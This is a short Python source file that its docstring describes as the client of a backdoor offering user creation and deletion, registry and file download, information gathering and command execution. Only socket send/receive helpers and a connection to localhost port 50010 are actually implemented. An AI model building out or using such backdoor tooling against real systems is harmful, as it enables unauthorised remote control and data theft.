#!/usr/bin/env python
__author__ = "Suraj S Kattige"
__version__ = "2.0.1"
__email__ = "suraj.kattige056@gmail.com"
__maintainer__ = "Suraj S Kattige"
'''
Description: This is the client program that exploits a target, creating a backdoor and executing the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

import socket, re, subprocess, time, struct

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len)

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data)
    return

def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)

def main():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    HOST = '127.0.0.1'
    PORT = 50010
    sock.connect((HOST,PORT))



main()